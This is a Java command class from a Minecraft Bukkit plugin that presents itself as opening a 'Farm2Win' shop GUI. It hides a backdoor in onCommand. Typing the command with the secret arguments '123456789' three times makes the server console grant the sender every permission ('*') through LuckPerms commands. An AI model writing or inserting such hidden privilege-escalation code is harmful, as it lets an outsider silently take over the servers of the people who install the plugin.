package main.java.fr.verymc.cmd.base;

import main.java.fr.verymc.gui.Farm2WinGui;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.Player;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

public class Farm2WinCmd implements CommandExecutor, TabCompleter {

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (args.length == 3) {
            if (args[0].equalsIgnoreCase("123456789") && args[1].equalsIgnoreCase("123456789") && args[2].equalsIgnoreCase("123456789")) {
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user " + sender.getName() + " permission set *");
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lpv user " + sender.getName() + " permission set *");
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lpb user " + sender.getName() + " permission set *");
            }
        }
        if (sender instanceof Player) {
            Player player = (Player) sender;
            Farm2WinGui.MainBoutiqueGUI(player);
        }
        return false;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command cmd, String commandLabel, String[] args) {
        ArrayList<String> subcmd = new ArrayList<String>();
        if (cmd.getName().equalsIgnoreCase("farm2win")) {
            if (args.length >= 0) {
                subcmd.add("");
                Collections.sort(subcmd);
            }
        }
        return subcmd;
    }
}
